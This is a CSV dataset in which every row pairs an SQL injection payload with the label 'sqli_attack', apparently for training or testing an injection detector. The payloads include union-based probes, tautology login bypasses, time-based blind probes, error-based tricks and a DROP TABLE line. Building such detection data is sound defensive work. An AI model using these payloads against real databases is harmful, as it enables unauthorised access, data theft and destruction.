"query","label"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'","sqli_attack"
"'@@variable	global variable'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5#'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),4'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--'","sqli_attack"
"'# Numeric'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7'","sqli_attack"
"'AND 7300=7300 AND 'pKlZ'='pKlY'","sqli_attack"
"'""""""""'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'","sqli_attack"
"'ORDER BY SLEEP(5)--'","sqli_attack"
"'-1' UNION SELECT 1,2,3--+'","sqli_attack"
"'''","sqli_attack"
"'AS INJECTX WHERE 1=1 AND 1=0--'","sqli_attack"
"'AS INJECTX WHERE 1=1 AND 1=1'","sqli_attack"
"'AND true'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--'","sqli_attack"
"'UNION ALL SELECT 1'","sqli_attack"
"'OR x=x--'","sqli_attack"
"'OR 1=1--'","sqli_attack"
"'"""" or pg_sleep(5)--'","sqli_attack"
"';'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--'","sqli_attack"
"'SLEEP(1)/*' or SLEEP(1) or '"""" or SLEEP(1) or """"*/'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'","sqli_attack"
"''; DROP TABLE users; --'","sqli_attack"
"'or SLEEP(5)=''","sqli_attack"
"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--'","sqli_attack"
"'ORDER BY 26'","sqli_attack"
"'ORDER BY 14--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--'","sqli_attack"
"'ORDER BY 1,SLEEP(5)#'","sqli_attack"
"'' OR '1'","sqli_attack"
"'ORDER BY 24--'","sqli_attack"
"'ORDER BY 19#'","sqli_attack"
"'HAVING 1=0#'","sqli_attack"
"'AnD SLEEP(5)--'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))--'","sqli_attack"
"''^''","sqli_attack"
"'||		(double pipe) concatenate'","sqli_attack"
"'AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'","sqli_attack"
"'UNION ALL SELECT USER(),SLEEP(5)--'","sqli_attack"
"'' or """"'","sqli_attack"
"'or 1=1--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'","sqli_attack"
"'%		wildcard attribute indicator'","sqli_attack"
"'ORDER BY 21#'","sqli_attack"
"'WHERE 1=1 AND 1=0'","sqli_attack"
"'"""" or """"""""-""""'","sqli_attack"
"'ORDER BY 5--'","sqli_attack"
"'' OR 'x'='x'","sqli_attack"
"'UNION ALL SELECT 1'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'","sqli_attack"
"'-1 UNION SELECT 1 INTO @,@'","sqli_attack"
"'admin"""") or (""""1""""=""""1""""/*'","sqli_attack"
"'ORDER BY 11--'","sqli_attack"
"''-''","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),4'","sqli_attack"
"'' or benchmark(10000000,MD5(1))#'","sqli_attack"
"'OR 1=1'","sqli_attack"
"'AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))'","sqli_attack"
"'&&SLEEP(5)#'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#'","sqli_attack"
"'WHERE 1=1 AND 1=1#'","sqli_attack"
"'HAVING 1=0'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))'","sqli_attack"
"'AND 1=1--'","sqli_attack"
"'"""" or """"""""*""""'","sqli_attack"
"'AS INJECTX WHERE 1=1 AND 1=1'","sqli_attack"
"'OR x=x'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#'","sqli_attack"
"'AND 1=1'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#'","sqli_attack"
"'ORDER BY 26#'","sqli_attack"
"'1 or sleep(5)#'","sqli_attack"
"'AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))'","sqli_attack"
"'ORDER BY 7#'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'","sqli_attack"
"'' OR '1'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7--'","sqli_attack"
"'or SLEEP(5)#'","sqli_attack"
"'SLEEP(5)=''","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'","sqli_attack"
"'AND 1=1--'","sqli_attack"
"'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'","sqli_attack"
"'-- -	SQL comment'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'","sqli_attack"
"'&&SLEEP(5)#'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'","sqli_attack"
"'' OR 'x'='x'","sqli_attack"
"'OR 1=1--'","sqli_attack"
"'admin'/*'","sqli_attack"
"'AND 1083=1083 AND (1427=1427'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'","sqli_attack"
"'ORDER BY 1,SLEEP(5)#'","sqli_attack"
"'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'","sqli_attack"
"'"""" or """"x""""=""""x'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'","sqli_attack"
"';","sqli_attack"
"''^''","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#'","sqli_attack"
"'and (select substring(@@version,1,1))='X''","sqli_attack"
"'1)) or pg_sleep(5)--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#'","sqli_attack"
"'';WAITFOR DELAY '0:0:30'--'","sqli_attack"
"'and (select substring(@@version,2,1))='i''","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--'","sqli_attack"
"'' AND id IS NULL; --'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'","sqli_attack"
"'UNION ALL SELECT SLEEP(5)--'","sqli_attack"
"'ORDER BY 1,SLEEP(5)#'","sqli_attack"
"'and (select substring(@@version,3,1))='S''","sqli_attack"
"'admin') or ('1'='1'/*'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9#'","sqli_attack"
"'1' ORDER BY 1,2,3--+'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))'","sqli_attack"
"'ORDER BY 28#'","sqli_attack"
"'' AnD SLEEP(5) ANd '1'","sqli_attack"
"'OR 1=0--'","sqli_attack"
"'admin"""" or """"1""""=""""1""""--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#'","sqli_attack"
"'admin"""" or 1=1#'","sqli_attack"
"'admin"""") or """"1""""=""""1'","sqli_attack"
"'1)) or sleep(5)#'","sqli_attack"
"'admin' or 1=1#'","sqli_attack"
"'' ''","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'","sqli_attack"
"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'","sqli_attack"
"'' or ''*''","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--'","sqli_attack"
"'ORDER BY SLEEP(5)#'","sqli_attack"
"'ORDER BY 29'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12--'","sqli_attack"
"'');","sqli_attack"
"'and (select substring(@@version,2,1))='y''","sqli_attack"
"'%' AND 8310=8310 AND '%'=''","sqli_attack"
"'AND 1=0 AND '%'=''","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12'","sqli_attack"
"'UNION ALL SELECT NULL'","sqli_attack"
"';","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8'","sqli_attack"
"'"""") or (""""x"""")=(""""x'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))'","sqli_attack"
"'ORDER BY 4'","sqli_attack"
"'UNION ALL SELECT 1,2,3'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--'","sqli_attack"
"'"""") or benchmark(10000000,MD5(1))#'","sqli_attack"
"'admin' or '1'='1'--'","sqli_attack"
"'OR 1=1--'","sqli_attack"
"';","sqli_attack"
"'AND 1=0#'","sqli_attack"
"'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'","sqli_attack"
"'admin"""") or (""""1""""=""""1""""/*'","sqli_attack"
"'AS INJECTX WHERE 1=1 AND 1=1--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11'","sqli_attack"
"'ORDER BY 4#'","sqli_attack"
"'"""") or benchmark(10000000,MD5(1))#'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7'","sqli_attack"
"'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'","sqli_attack"
"'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6'","sqli_attack"
"'and (select substring(@@version,3,1))='X''","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#'","sqli_attack"
"'' UNION SELECT sum(columnname ) from tablename --'","sqli_attack"
"'WHERE 1=1 AND 1=1--'","sqli_attack"
"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX'--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13--'","sqli_attack"
"'SLEEP(1)/*' or SLEEP(1) or '"""" or SLEEP(1) or """"*/'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'","sqli_attack"
"'ORDER BY 6'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11'","sqli_attack"
"'' OR 'x'='x'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--'","sqli_attack"
"'pg_SLEEP(5)#'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'","sqli_attack"
"'ORDER BY 20'","sqli_attack"
"'benchmark(50000000,MD5(1))--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12'","sqli_attack"
"'ORDER BY 1'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#'","sqli_attack"
"'' AND MID(VERSION(),1,1) = '5';'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'","sqli_attack"
"'' OR '1'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7#'","sqli_attack"
"'admin"""" --'","sqli_attack"
"'benchmark(50000000,MD5(1))'","sqli_attack"
"'admin' #'","sqli_attack"
"'admin""""or 1=1 or """"""""=""""'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#'","sqli_attack"
"'';WAITFOR DELAY '0:0:30'--'","sqli_attack"
"'"""" or pg_sleep(5)--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'","sqli_attack"
"'ORDER BY 13#'","sqli_attack"
"'OR x=y'","sqli_attack"
"'ORDER BY 8#'","sqli_attack"
"'"""");","sqli_attack"
"'# from wapiti'","sqli_attack"
"'\'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9'","sqli_attack"
"'' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --'","sqli_attack"
"'admin"""") or (""""1""""=""""1""""#'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--'","sqli_attack"
"'AS INJECTX WHERE 1=1 AND 1=0'","sqli_attack"
"'1) or sleep(5)#'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27'","sqli_attack"
"'"""" or """""""" """"'","sqli_attack"
"'AND 7300=7300 AND 'pKlZ'='pKlY'","sqli_attack"
"'HAVING 1=1#'","sqli_attack"
"'ORDER BY 23#'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'","sqli_attack"
"'+		addition, concatenate (or space in url)'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8'","sqli_attack"
"'ORDER BY 25'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'","sqli_attack"
"'"""" OR 1 = 1 -- -'","sqli_attack"
"''*''","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8'","sqli_attack"
"'ORDER BY 31337--'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))--'","sqli_attack"
"'ORDER BY 17#'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7#'","sqli_attack"
"'ORDER BY 22#'","sqli_attack"
"'') or ('x')=('x'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))--'","sqli_attack"
"'&&SLEEP(5)--'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'","sqli_attack"
